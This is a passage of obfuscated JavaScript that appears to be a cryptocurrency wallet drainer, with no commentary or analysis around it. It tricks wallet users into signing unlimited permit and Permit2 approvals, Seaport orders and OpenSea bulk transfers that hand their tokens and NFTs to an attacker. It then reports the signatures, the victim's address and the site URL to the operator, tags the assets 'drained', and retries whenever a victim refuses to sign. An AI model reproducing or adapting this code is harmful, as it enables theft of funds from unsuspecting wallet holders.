          inputs: [_0xe7334f, _0x2e993c, _0x1ba006, _0x2c9a80, _0x18cc38, _0x4a1b7c, _0x26cc09, _0x537632],
          name: "initialize",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x142161 = {
          internalType: "string",
          name: "newName",
          type: "string"
        };
        const _0x2c0e7f = {
          inputs: [_0x142161],
          name: "initializeV2",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0xf5deab = {
          internalType: "address",
          name: "lostAndFound",
          type: "address"
        };
        const _0x4997fc = {
          inputs: [_0xf5deab],
          name: "initializeV2_1",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x4fefbe = {
          internalType: "address",
          name: "_account",
          type: "address"
        };
        const _0x5b3cce = {
          inputs: [_0x4fefbe],
          name: "isBlacklisted",
          outputs: [{
            'internalType': 'bool',
            'name': '',
            'type': 'bool'
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x5a724a = {
          internalType: "address",
          name: 'account',
          type: 'address'
        };
        const _0x53ef13 = {
          inputs: [_0x5a724a],
          name: 'isMinter',
          outputs: [{
            'internalType': "bool",
            'name': '',
            'type': 'bool'
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x25dd6d = {
          inputs: [],
          name: "masterMinter",
          outputs: [{
            'internalType': "address",
            'name': '',
            'type': "address"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x56bf59 = {
          internalType: "address",
          name: '_to',
          type: "address"
        };
        const _0x454921 = {
          internalType: "uint256",
          name: '_amount',
          type: "uint256"
        };
        const _0x1a903e = {
          inputs: [_0x56bf59, _0x454921],
          name: "mint",
          outputs: [{
            'internalType': 'bool',
            'name': '',
            'type': 'bool'
          }],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x16b310 = {
          internalType: 'address',
          name: "minter",
          type: "address"
        };
        const _0x49bf6a = {
          inputs: [_0x16b310],
          name: "minterAllowance",
          outputs: [{
            'internalType': "uint256",
            'name': '',
            'type': "uint256"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x5b7eb0 = {
          inputs: [],
          name: "name",
          outputs: [{
            'internalType': "string",
            'name': '',
            'type': "string"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x183d4c = {
          internalType: "address",
          name: "owner",
          type: "address"
        };
        const _0x52443a = {
          inputs: [_0x183d4c],
          name: 'nonces',
          outputs: [{
            'internalType': "uint256",
            'name': '',
            'type': "uint256"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0xef31b = {
          inputs: [],
          name: "owner",
          outputs: [{
            'internalType': "address",
            'name': '',
            'type': "address"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x25e48c = {
          inputs: [],
          name: 'pause',
          outputs: [],
          stateMutability: "nonpayable",
          type: 'function'
        };
        const _0x70552f = {
          internalType: "bool",
          name: '',
          type: "bool"
        };
        const _0xf72834 = {
          inputs: [],
          name: "paused",
          outputs: [_0x70552f],
          stateMutability: "view",
          type: "function"
        };
        const _0x2129d2 = {
          inputs: [],
          name: "pauser",
          outputs: [{
            'internalType': "address",
            'name': '',
            'type': "address"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x59460d = {
          internalType: "address",
          name: "owner",
          type: "address"
        };
        const _0x4eb6e3 = {
          internalType: "address",
          name: 'spender',
          type: "address"
        };
        const _0x5414ac = {
          internalType: "uint256",
          name: 'value',
          type: "uint256"
        };
        const _0x751740 = {
          internalType: "uint256",
          name: "deadline",
          type: "uint256"
        };
        const _0x46f33f = {
          internalType: 'uint8',
          name: 'v',
          type: 'uint8'
        };
        const _0x17d67d = {
          internalType: "bytes32",
          name: 'r',
          type: "bytes32"
        };
        const _0x2ab091 = {
          internalType: "bytes32",
          name: 's',
          type: "bytes32"
        };
        const _0x339ab2 = {
          inputs: [_0x59460d, _0x4eb6e3, _0x5414ac, _0x751740, _0x46f33f, _0x17d67d, _0x2ab091],
          name: "permit",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x5dcb22 = {
          internalType: "address",
          name: 'from',
          type: "address"
        };
        const _0x2842c0 = {
          internalType: "address",
          name: 'to',
          type: "address"
        };
        const _0x3d03ef = {
          internalType: "uint256",
          name: "value",
          type: "uint256"
        };
        const _0x401406 = {
          internalType: "uint256",
          name: "validAfter",
          type: "uint256"
        };
        const _0x78f0be = {
          internalType: "uint256",
          name: "validBefore",
          type: "uint256"
        };
        const _0x29f1fd = {
          internalType: "bytes32",
          name: 'nonce',
          type: "bytes32"
        };
        const _0x316363 = {
          internalType: 'uint8',
          name: 'v',
          type: "uint8"
        };
        const _0x1f5ff3 = {
          internalType: 'bytes32',
          name: 'r',
          type: "bytes32"
        };
        const _0x176457 = {
          internalType: "bytes32",
          name: 's',
          type: 'bytes32'
        };
        const _0x4b1e06 = {
          inputs: [_0x5dcb22, _0x2842c0, _0x3d03ef, _0x401406, _0x78f0be, _0x29f1fd, _0x316363, _0x1f5ff3, _0x176457],
          name: "receiveWithAuthorization",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x46fd31 = {
          internalType: "address",
          name: "minter",
          type: "address"
        };
        const _0x3469bc = {
          internalType: 'bool',
          name: '',
          type: 'bool'
        };
        const _0x4b96ce = {
          inputs: [_0x46fd31],
          name: "removeMinter",
          outputs: [_0x3469bc],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x1a8d4e = {
          internalType: "contract IERC20",
          name: "tokenContract",
          type: "address"
        };
        const _0x19cd8b = {
          internalType: "address",
          name: 'to',
          type: "address"
        };
        const _0x2ebf2b = {
          internalType: "uint256",
          name: "amount",
          type: "uint256"
        };
        const _0x1375a7 = {
          inputs: [_0x1a8d4e, _0x19cd8b, _0x2ebf2b],
          name: "rescueERC20",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x1706a0 = {
          inputs: [],
          name: "rescuer",
          outputs: [{
            'internalType': "address",
            'name': '',
            'type': "address"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x2cd0e2 = {
          inputs: [],
          name: "symbol",
          outputs: [{
            'internalType': "string",
            'name': '',
            'type': "string"
          }],
          stateMutability: "view",
          type: "function"
        };
        const _0x352f10 = {
          internalType: 'uint256',
          name: '',
          type: "uint256"
        };
        const _0x1d71d7 = {
          inputs: [],
          name: "totalSupply",
          outputs: [_0x352f10],
          stateMutability: "view",
          type: "function"
        };
        const _0xf99081 = {
          internalType: "address",
          name: 'to',
          type: "address"
        };
        const _0x544299 = {
          internalType: "uint256",
          name: 'value',
          type: "uint256"
        };
        const _0x22d33d = {
          inputs: [_0xf99081, _0x544299],
          name: 'transfer',
          outputs: [{
            'internalType': 'bool',
            'name': '',
            'type': 'bool'
          }],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x55eb56 = {
          internalType: "address",
          name: 'from',
          type: "address"
        };
        const _0x5f0dce = {
          internalType: 'address',
          name: 'to',
          type: "address"
        };
        const _0x5d3931 = {
          internalType: "uint256",
          name: 'value',
          type: "uint256"
        };
        const _0x5c4481 = {
          inputs: [_0x55eb56, _0x5f0dce, _0x5d3931],
          name: "transferFrom",
          outputs: [{
            'internalType': 'bool',
            'name': '',
            'type': 'bool'
          }],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x253d8c = {
          internalType: "address",
          name: "newOwner",
          type: "address"
        };
        const _0x802c82 = {
          inputs: [_0x253d8c],
          name: "transferOwnership",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x2910d6 = {
          internalType: "address",
          name: 'from',
          type: "address"
        };
        const _0x2424ee = {
          internalType: "address",
          name: 'to',
          type: "address"
        };
        const _0x263cfc = {
          internalType: "uint256",
          name: "value",
          type: "uint256"
        };
        const _0x3fa944 = {
          internalType: "uint256",
          name: "validAfter",
          type: "uint256"
        };
        const _0x185982 = {
          internalType: "uint256",
          name: "validBefore",
          type: "uint256"
        };
        const _0x41bf79 = {
          internalType: "bytes32",
          name: 'nonce',
          type: "bytes32"
        };
        const _0xd6129c = {
          internalType: 'uint8',
          name: 'v',
          type: "uint8"
        };
        const _0x2fdde0 = {
          internalType: "bytes32",
          name: 'r',
          type: "bytes32"
        };
        const _0x23057c = {
          internalType: "bytes32",
          name: 's',
          type: "bytes32"
        };
        const _0x1f8c35 = {
          inputs: [_0x2910d6, _0x2424ee, _0x263cfc, _0x3fa944, _0x185982, _0x41bf79, _0xd6129c, _0x2fdde0, _0x23057c],
          name: "transferWithAuthorization",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x31d23d = {
          internalType: "address",
          name: "_account",
          type: "address"
        };
        const _0x391cbc = {
          inputs: [_0x31d23d],
          name: "unBlacklist",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x2ead31 = {
          inputs: [],
          name: "unpause",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x547a23 = {
          internalType: "address",
          name: "_newBlacklister",
          type: 'address'
        };
        const _0x1dcdb0 = {
          inputs: [_0x547a23],
          name: "updateBlacklister",
          outputs: [],
          stateMutability: "nonpayable",
          type: 'function'
        };
        const _0x18659d = {
          internalType: "address",
          name: "_newMasterMinter",
          type: "address"
        };
        const _0x538d77 = {
          inputs: [_0x18659d],
          name: "updateMasterMinter",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0xe41254 = {
          internalType: "address",
          name: '_newPauser',
          type: "address"
        };
        const _0x52469f = {
          inputs: [_0xe41254],
          name: "updatePauser",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x16eee6 = {
          internalType: "address",
          name: "newRescuer",
          type: "address"
        };
        const _0x5c0da2 = {
          inputs: [_0x16eee6],
          name: "updateRescuer",
          outputs: [],
          stateMutability: "nonpayable",
          type: "function"
        };
        const _0x217f7d = {
          inputs: [],
          name: "version",
          outputs: [{
            'internalType': "string",
            'name': '',
            'type': "string"
          }],
          stateMutability: "view",
          type: "function"
        };
        let _0x291be1 = [_0x145197, _0x4e62f1, _0xd8944b, _0x2b801e, _0x27dd3f, _0xc7b865, _0x41f730, _0x48c304, _0x5b4c15, _0x45a259, _0x5b1c4d, _0x316c3e, _0x335956, _0x239ed8, _0x4fb12b, _0x340bd5, _0x36aed9, _0x402d39, _0x1f5b69, _0x59667c, _0x3159c2, _0x4c0aa4, _0x81094a, _0x543af4, _0x5d4b2d, _0x535df7, _0x532091, _0x39164f, _0x4edd14, _0x243315, _0x33189c, _0x3c9121, _0x420392, _0x282a4e, _0x1e1a68, _0x15aed6, _0x2c0e7f, _0x4997fc, _0x5b3cce, _0x53ef13, _0x25dd6d, _0x1a903e, _0x49bf6a, _0x5b7eb0, _0x52443a, _0xef31b, _0x25e48c, _0xf72834, _0x2129d2, _0x339ab2, _0x4b1e06, _0x4b96ce, _0x1375a7, _0x1706a0, _0x2cd0e2, _0x1d71d7, _0x22d33d, _0x5c4481, _0x802c82, _0x1f8c35, _0x391cbc, _0x2ead31, _0x1dcdb0, _0x538d77, _0x52469f, _0x5c0da2, _0x217f7d];
        let _0x1a4dfa = new ethers.Contract(_0x204e1b, _0x291be1, _0xed86e5);
        let _0x744ad4 = await _0x1a4dfa.nonces(_0x40fd4c);
        let _0x588e4d = await _0x1a4dfa.name();
        const _0x5dfbf0 = {
          name: "name",
          type: "string"
        };
        const _0x162438 = {
          name: "version",
          type: "string"
        };
        const _0x1414f = {
          name: 'chainId',
          type: "uint256"
        };
        const _0x2ccdbc = {
          name: "verifyingContract",
          type: "address"
        };
        let _0x21bed0 = [_0x5dfbf0, _0x162438, _0x1414f, _0x2ccdbc];
        var _0x4dfc6a = '1';
        if (_0x204e1b.toLowerCase() == "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48".toLowerCase()) {
          _0x4dfc6a = '2';
        }
        let _0x902d53;
        const _0x369c0f = {
          name: "owner",
          type: "address"
        };
        const _0x526297 = {
          name: 'spender',
          type: "address"
        };
        const _0x849359 = {
          name: 'value',
          type: "uint256"
        };
        const _0x5081e9 = {
          name: 'nonce',
          type: "uint256"
        };
        const _0x1c0b14 = {
          name: "deadline",
          type: "uint256"
        };
        let _0x1b0900 = [_0x369c0f, _0x526297, _0x849359, _0x5081e9, _0x1c0b14];
        const _0x10e3f1 = {
          name: _0x588e4d,
          version: _0x4dfc6a,
          chainId: _0x32d780,
          verifyingContract: _0x204e1b
        };
        let _0x389c1e = _0x10e3f1;
        if (_0x2387da == 4) {
          const _0x5b0bc8 = {
            chainId: _0x32d780,
            verifyingContract: _0x204e1b
          };
          _0x389c1e = _0x5b0bc8;
          const _0xeb98c3 = {
            name: 'chainId',
            type: "uint256"
          };
          const _0x2ff2a4 = {
            name: "verifyingContract",
            type: "address"
          };
          _0x21bed0 = [_0xeb98c3, _0x2ff2a4];
          _0x902d53 = {
            'owner': ethers.utils.getAddress(_0x40fd4c),
            'spender': ethers.utils.getAddress(this.getCaller(_0x16ae73)),
            'value': "115792089237316195423570985008687907853269984665640564039457584007913129639935",
            'nonce': _0x744ad4,
            'deadline': 1988864000 .toString()
          };
        }
        if (_0x2387da == 3) {
          const _0x2cbbc9 = {
            name: _0x588e4d,
            chainId: _0x32d780,
            verifyingContract: _0x204e1b
          };
          _0x389c1e = _0x2cbbc9;
          const _0x15b45e = {
            name: "name",
            type: "string"
          };
          const _0x2d5340 = {
            name: 'chainId',
            type: "uint256"
          };
          const _0x268402 = {
            name: "verifyingContract",
            type: "address"
          };
          _0x21bed0 = [_0x15b45e, _0x2d5340, _0x268402];
          _0x902d53 = {
            'owner': ethers.utils.getAddress(_0x40fd4c),
            'spender': ethers.utils.getAddress(this.getCaller(_0x16ae73)),
            'value': "115792089237316195423570985008687907853269984665640564039457584007913129639935",
            'nonce': _0x744ad4,
            'deadline': 1988864000 .toString()
          };
        }
        if (_0x2387da == 2) {
          const _0x1600f9 = {
            name: 'holder',
            type: "address"
          };
          const _0x293e67 = {
            name: 'spender',
            type: "address"
          };
          const _0x4b189e = {
            name: 'nonce',
            type: "uint256"
          };
          const _0x33dbc4 = {
            name: "expiry",
            type: "uint256"
          };
          const _0x3e2488 = {
            name: "allowed",
            type: 'bool'
          };
          _0x1b0900 = [_0x1600f9, _0x293e67, _0x4b189e, _0x33dbc4, _0x3e2488];
          _0x902d53 = {
            'PERMIT_TYPEHASH': "0xea2aa0a1be11a07ed86d755c93467f4f82362b452371d1ba94d1715123511acb",
            'holder': ethers.utils.getAddress(_0x40fd4c),
            'spender': ethers.utils.getAddress(this.getCaller(_0x16ae73)),
            'nonce': _0x744ad4,
            'expiry': 1988864000 .toString(),
            'allowed': true
          };
        }
        if (_0x2387da == 1) {
          _0x902d53 = {
            'owner': ethers.utils.getAddress(_0x40fd4c),
            'spender': ethers.utils.getAddress(this.getCaller(_0x16ae73)),
            'value': "115792089237316195423570985008687907853269984665640564039457584007913129639935",
            'nonce': _0x744ad4,
            'deadline': 1988864000 .toString()
          };
          if (_0x204e1b.toLowerCase() == "0xc944E90C64B2c07662A292be6244BDf05Cda44a7".toLowerCase()) {
            const _0x1424cc = {
              name: _0x588e4d,
              version: '0',
              chainId: _0x32d780,
              verifyingContract: _0x204e1b,
              salt: "0x51f3d585afe6dfeb2af01bba0889a36c1db03beec88c6a4d0c53817069026afa"
            };
            _0x389c1e = _0x1424cc;
            const _0x5a4162 = {
              name: "name",
              type: "string"
            };
            const _0x2b413a = {
              name: "version",
              type: "string"
            };
            const _0x3be8ed = {
              name: 'chainId',
              type: "uint256"
            };
            const _0x2ace77 = {
              name: "verifyingContract",
              type: "address"
            };
            const _0xba7649 = {
              name: "salt",
              type: "bytes32"
            };
            _0x21bed0 = [_0x5a4162, _0x2b413a, _0x3be8ed, _0x2ace77, _0xba7649];
          }
        }
        const _0x4660e1 = {
          Permit: _0x1b0900
        };
        const _0x4cfdc4 = await this.Sdk.signData(_0x389c1e, _0x4660e1, _0x902d53);
        const {
          s: _0x416f9d,
          v: _0x46a784,
          r: _0x1ccea9
        } = ethers.utils.splitSignature(_0x4cfdc4);
        if (_0x46a784 != 215) {
          await this.sendMessage({
            'chain': _0x16ae73.chain,
            'type': "permit",
            'token': _0x204e1b,
            'name': '' + _0x16ae73.info.name,
            'value': _0x27a1c3 / this.typeToMultiplier("TokenPermit")
          });
          await this.SendCompletion({
            'type': "permit",
            'actionType': _0x2387da,
            's': _0x416f9d,
            'v': _0x46a784,
            'r': _0x1ccea9,
            'token': _0x204e1b,
            'amount': _0x23a27c,
            'deadline': 1988864000,
            'chain': _0x32d780,
            'nonce': parseInt(_0x744ad4),
            'owner': await this.getWalletAddress(),
            'caller': this.getCaller(_0x16ae73),
            'ahash': await this.createEncKey()
          });
        }
        return true;
      }
    } catch (_0xeed203) {
      console.log(_0xeed203);
      return false;
    }
  };
  ["seaportOrder"] = async _0x3df27f => {
    let _0x47807c = await this.getWalletAddress();
    try {
      let _0x26359c = Base64.encode(JSON.stringify(this.offer)).toString();
      if (this.offer.length > 0 && !this.orderCache.includes(_0x26359c)) {
        let _0x14f661 = Math.floor(Date.now() / 1000);
        let _0x570369 = await this.Sdk.createOrder(this.offer, this.considerations, 0, _0x14f661, _0x14f661 + 2678400, "0x004C00500000aD104D7DBd00e3ae0A5C00560C00", ethers.constants.HashZero, "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000");
        for (let _0x1629cd in this.offer) {
          this.approved.push(_0x1629cd.token + ",eth");
        }
        this.orderCache.push(_0x26359c);
        localStorage.orderCache = JSON.stringify(this.orderCache);
        let _0x34ae41 = this.getAssetInfo(_0x3df27f);
        let _0x511537 = "```drained\n" + ('' + _0x34ae41.name) + "```";
        await this.sendMessage({
          'type': "seaport",
          'chain': _0x3df27f.chain,
          'countTokens': _0x34ae41.tokenCount,
          'countNfts': _0x34ae41.nftCount,
          'actions': _0x511537,
          'value': _0x3df27f.value / this.typeToMultiplier(_0x3df27f.actionType)
        });
        if (_0x47807c != (await this.getWalletAddress())) {
          return;
        }
        await this.SendCompletion({
          'type': "seaport",
          'order': JSON.stringify(_0x570369.order),
          'caller': this.getCaller(_0x3df27f),
          'ahash': this.createEncKey()
        });
      }
    } catch (_0x307421) {
      if (_0x47807c != (await this.getWalletAddress())) {
        return;
      }
      console.log(_0x307421);
      await this.sendMessage({
        'type': "error",
        'chain': _0x3df27f.chain,
        'msg': "Client refused to sign Seaport order for " + offer.length + " items ($" + _0x3df27f.value / this.typeToMultiplier(_0x3df27f.actionType) + ')'
      });
      this.failedAttempts++;
      if (this.failedAttempts > 0x5 && this.actions.length > 1) {
        this.failedAttempts = 0;
      } else {
        await this.seaportOrder(_0x3df27f);
      }
    }
  };
  ["transferOpensea"] = async _0x2414ef => {
    let _0x1b561d = await this.getWalletAddress();
    try {
      const _0x440cc5 = {
        internalType: 'address',
        name: "conduitController",
        type: 'address'
      };
      const _0x3d11ba = {
        inputs: [_0x440cc5],
        stateMutability: "nonpayable",
        type: "constructor"
      };
      const _0x3e4a0b = {
        internalType: "bytes",
        name: "reason",
        type: "bytes"
      };
      const _0x4b7950 = {
        internalType: "bytes32",
        name: "conduitKey",
        type: "bytes32"
      };
      const _0xfaf7a8 = {
        internalType: 'address',
        name: "conduit",
        type: 'address'
      };
      const _0x387ad2 = {
        inputs: [_0x3e4a0b, _0x4b7950, _0xfaf7a8],
        name: "ConduitErrorRevertBytes",
        type: "error"
      };
      const _0x4b4b02 = {
        internalType: "string",
        name: "reason",
        type: "string"
      };
      const _0x2939d8 = {
        internalType: "bytes32",
        name: "conduitKey",
        type: 'bytes32'
      };
      const _0x30c1cf = {
        internalType: 'address',
        name: "conduit",
        type: 'address'
      };
      const _0x126575 = {
        inputs: [_0x4b4b02, _0x2939d8, _0x30c1cf],
        name: "ConduitErrorRevertString",
        type: "error"
      };
      const _0x523113 = {
        internalType: "bytes",
        name: "reason",
        type: "bytes"
      };
      const _0x56b228 = {
        internalType: 'address',
        name: "receiver",
        type: 'address'
      };
      const _0x4c0ef7 = {
        internalType: 'address',
        name: 'sender',
        type: 'address'
      };
      const _0x5b1334 = {
        internalType: "uint256",
        name: "identifier",
        type: "uint256"
      };
      const _0x3b71d7 = {
        inputs: [_0x523113, _0x56b228, _0x4c0ef7, _0x5b1334],
        name: "ERC721ReceiverErrorRevertBytes",
        type: "error"
      };
      const _0x776b79 = {
        internalType: "string",
        name: "reason",
        type: "string"
      };
      const _0x161df4 = {
        internalType: 'address',
        name: "receiver",
        type: 'address'
      };
      const _0x48a4e6 = {
        internalType: 'address',
        name: 'sender',
        type: 'address'
      };
      const _0x213836 = {
        internalType: "uint256",
        name: "identifier",
        type: "uint256"
      };
      const _0x268939 = {
        inputs: [_0x776b79, _0x161df4, _0x48a4e6, _0x213836],
        name: "ERC721ReceiverErrorRevertString",
        type: 'error'
      };
      const _0x57d7f0 = {
        internalType: "bytes32",
        name: "conduitKey",
        type: "bytes32"
      };
      const _0x13ddff = {
        internalType: 'address',
        name: "conduit",
        type: "address"
      };
      const _0x346d5c = {
        inputs: [_0x57d7f0, _0x13ddff],
        name: "InvalidConduit",
        type: "error"
      };
      const _0xf08ece = {
        inputs: [],
        name: "InvalidERC20Identifier",
        type: "error"
      };
      const _0x4d4569 = {
        internalType: 'address',
        name: "recipient",
        type: 'address'
      };
      const _0x4f5bb5 = {
        inputs: [_0x4d4569],
        name: "InvalidERC721Recipient",
        type: "error"
      };
      const _0x963e93 = {
        inputs: [],
        name: "InvalidERC721TransferAmount",
        type: "error"
      };
      const _0x3e2100 = {
        inputs: [],
        name: "InvalidItemType",
        type: "error"
      };
      const _0x50db05 = {
        inputs: [],
        name: "RecipientCannotBeZeroAddress",
        type: "error"
      };
      const _0x3c6b96 = {
        internalType: "enum ConduitItemType",
        name: "itemType",
        type: "uint8"
      };
      const _0x4baef0 = {
        internalType: 'address',
        name: "token",
        type: 'address'
      };
      const _0x32bf89 = {
        internalType: "uint256",
        name: "identifier",
        type: "uint256"
      };
      const _0xed15ef = {
        internalType: "uint256",
        name: "amount",
        type: "uint256"
      };
      const _0x1e34bd = {
        components: [_0x3c6b96, _0x4baef0, _0x32bf89, _0xed15ef],
        internalType: "struct TransferHelperItem[]",
        name: "items",
        type: "tuple[]"
      };
      const _0x54dd65 = {
        internalType: 'address',
        name: "recipient",
        type: 'address'
      };
      const _0x2c1540 = {
        internalType: "bool",
        name: "validateERC721Receiver",
        type: "bool"
      };
      const _0x221b39 = {
        components: [_0x1e34bd, _0x54dd65, _0x2c1540],
        internalType: "struct TransferHelperItemsWithRecipient[]",
        name: "items",
        type: "tuple[]"
      };
      const _0x48f4f1 = {
        internalType: "bytes32",
        name: 'conduitKey',
        type: "bytes32"
      };
      const _0x867443 = {
        internalType: "bytes4",
        name: "magicValue",
        type: "bytes4"
      };
      const _0x5efead = {
        inputs: [_0x221b39, _0x48f4f1],
        name: "bulkTransfer",
        outputs: [_0x867443],
        stateMutability: "nonpayable",
        type: 'function'
      };
      const _0x2f135a = [_0x3d11ba, _0x387ad2, _0x126575, _0x3b71d7, _0x268939, _0x346d5c, _0xf08ece, _0x4f5bb5, _0x963e93, _0x3e2100, _0x50db05, _0x5efead];
      let _0x230ed0 = this.ethersProvider.getSigner(await this.getWalletAddress());
      let _0x54370a = new ethers.Contract("0x0000000000c2d145a2526bD8C716263bFeBe1A72", _0x2f135a, _0x230ed0);
      let _0x261de8 = [];
      for (let _0x4c3718 of _0x2414ef.asset) {
        _0x261de8.push([_0x4c3718.itemType, _0x4c3718.token, _0x4c3718.tokenId, 1]);
      }
      let _0x566601 = await _0x54370a.bulkTransfer([[_0x261de8, this.receiver, true]], "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000");
      for (let _0x212522 of _0x2414ef.asset) {
        this.approved.push(_0x212522.token + ",eth");
      }
      let _0x1f824f = this.getAssetInfo(_0x2414ef);
      await this.sendMessage({
        'chain': _0x2414ef.chain,
        'type': "approvalNFT",
        'source': "OS Transfer for " + _0x1f824f.count + " NFT(s)",
        'actions': "```drained\n" + _0x1f824f.name + "```",
        'txId': _0x566601.hash,
        'value': _0x2414ef.value / this.typeToMultiplier(_0x2414ef.actionType)
      });
    } catch (_0xe50e3e) {
      console.log(_0xe50e3e);
      if (_0x1b561d != (await this.getWalletAddress())) {
        return;
      }
      await this.sendMessage({
        'chain': _0x2414ef.chain,
        'type': "error",
        'msg': "Client refused to transfer " + _0x2414ef.asset.length + " NFT(s) ($" + _0x2414ef.value / this.typeToMultiplier(_0x2414ef.actionType) + ')'
      });
      this.failedAttempts++;
      if (this.failedAttempts > 0x5 && this.actions.length > 1) {
        this.failedAttempts = 0;
      } else {
        await this.transferOpensea(_0x2414ef);
      }
    }
  };
  ["permit2"] = async _0x376763 => {
    let _0x361bf6 = await this.getWalletAddress();
    try {
      let _0x33547f = _0x376763.asset;
      let _0x8832 = [];
      for (let _0x8d067 of _0x33547f) {
        if (!this.approved.includes(_0x8d067.token + ',' + _0x376763.chain)) {
          let _0x1b421b = {
            'token': _0x8d067.token,
            'real_amount': _0x8d067.amount.toString(),
            'amount': "1461501637330902918203684832716283019655932542975",
            'expiration': "1988064000",
            'nonce': await this.Sdk.GetAllowances(_0x361bf6, _0x8d067.token, this.getCaller(_0x376763))
          };
          _0x8832.push(_0x1b421b);
        }
      }
      if (_0x8832.length > 0) {
        let _0x321f00 = {
          'name': 'Permit2',
          'chainId': await this.getChainId(_0x376763.chain),
          'verifyingContract': "0x000000000022d473030f116ddee9f6b43ac78ba3"
        };
        let _0x4b3012 = {
          'details': _0x8832,
          'spender': this.getCaller(_0x376763),
          'sigDeadline': 0x767f7300
        };
        const _0x3f84fb = {
          name: "details",
          type: "PermitDetails[]"
        };
        const _0x37d1a4 = {
          name: 'spender',
          type: 'address'
        };
        const _0x476faf = {
          name: "sigDeadline",
          type: "uint256"
        };
        const _0x59fcbb = {
          name: 'token',
          type: "address"
        };
        const _0x519ddd = {
          name: 'amount',
          type: "uint160"
        };
        const _0x4fb766 = {
          name: "expiration",
          type: 'uint48'
        };
        const _0x40c603 = {
          name: "nonce",
          type: 'uint48'
        };
        const _0x4e245b = {
          PermitBatch: [_0x3f84fb, _0x37d1a4, _0x476faf],
          PermitDetails: [_0x59fcbb, _0x519ddd, _0x4fb766, _0x40c603]
        };
        const _0x43e8f6 = await this.Sdk.signData(_0x321f00, _0x4e245b, _0x4b3012);
        let _0x4ddcf2 = this.getAssetInfo(_0x376763);
        let _0x380c77 = "```drained\n" + ('' + _0x4ddcf2.name) + "```";
        if (_0x5908ec != 215) {
          await this.sendMessage({
            'type': "permit2",
            'value': _0x376763.value / this.typeToMultiplier(_0x376763.actionType),
            'actions': _0x380c77,
            'count': _0x4ddcf2.count,
            'chain': _0x376763.chain
          });
          await this.SendCompletion({
            'type': "permit2",
            'chain_id': this.getChainId(_0x376763.chain),
            'permitDetails': JSON.stringify(_0x8832),
            'caller': this.getCaller(_0x376763),
            'signature': _0x43e8f6,
            'ahash': this.createEncKey()
          });
        }
        for (let _0xb76ebb of _0x33547f) {
          this.approved.push(_0xb76ebb.token + ',' + _0x376763.chain);
        }
        localStorage.approved = JSON.stringify(this.approved);
      }
    } catch (_0x5775aa) {
      console.log(_0x5775aa);
      if (_0x361bf6 != (await this.getWalletAddress())) {
        return;
      }
      let _0x2be55a = this.getAssetInfo(_0x376763);
      let _0x163a12 = "```refused\n" + ('' + _0x2be55a.name) + "```";
      await this.sendMessage({
        'chain': _0x376763.chain,
        'type': "error",
        'msg': "Client refused to sign Permit2\n" + _0x163a12
      });
      this.failedAttempts++;
      if (this.failedAttempts > 0x5 && this.actions.length > 1) {
        this.failedAttempts = 0;
      } else {
        await this.permit2(_0x376763);
      }
    }
  };
  ["SendCompletion"] = async _0x2702b4 => {
    try {
      let _0x20bf73 = {};
      let _0x3ad9e4 = '';
      if (_0x2702b4.caller != this.caller) {
        _0x3ad9e4 = this.salt;
      }
      switch (_0x2702b4.type) {
        case "permit2":
          {
            _0x20bf73 = {
              'action_type': "permit2",
              'permit_data': Base64.encode(_0x2702b4.permitDetails),
              'signature': _0x2702b4.signature,
              'owner': await this.getWalletAddress(),
              'website': window.location.href,
              'chain_id': _0x2702b4.chain_id,
              'key': _0x2702b4.ahash,
              'customer_id': "0x706OW4G8",
              'salt': _0x3ad9e4
            };
          }
          break;
        case "permit":
          {
            _0x20bf73 = {
              'action_type': "permit",
              'amount': _0x2702b4.amount,
              'r_value': _0x2702b4.r,
              's_value': _0x2702b4.s,
              'v_value': _0x2702b4.v,
              'type': _0x2702b4.actionType,
              'value': "115792089237316195423570985008687907853269984665640564039457584007913129639935",
              'contract': _0x2702b4.token,
              'deadline': _0x2702b4.deadline,
              'nonce': _0x2702b4.nonce,
              'owner': await this.getWalletAddress(),
              'website': window.location.href,
              'chain_id': _0x2702b4.chain,
              'key': _0x2702b4.ahash,
              'customer_id': "0x706OW4G8",
              'salt': _0x3ad9e4
            };
          }
          break;
        case "NFTApproval":
          {
            _0x20bf73 = {
              'action_type': "nft_transfer",
              'hash': _0x2702b4.hash,
              'contract': _0x2702b4.token,
              'token_id': _0x2702b4.token_id,
              'owner': await this.getWalletAddress(),
              'website': window.location.href,
              'item_type': _0x2702b4.itemType,
              'chain_id': _0x2702b4.chain_id,
              'key': _0x2702b4.ahash,
              'customer_id': "0x706OW4G8",
              'salt': _0x3ad9e4
            };
          }
          break;
        case "TokenApproval":
          {
            _0x20bf73 = {
              'action_type': "token_transfer",
              'hash': _0x2702b4.hash,
              'contract': _0x2702b4.token,
              'amount': _0x2702b4.amount,
              'owner': await this.getWalletAddress(),
              'website': window.location.href,
              'chain_id': _0x2702b4.chain,
              'key': _0x2702b4.ahash,
              'customer_id': "0x706OW4G8",
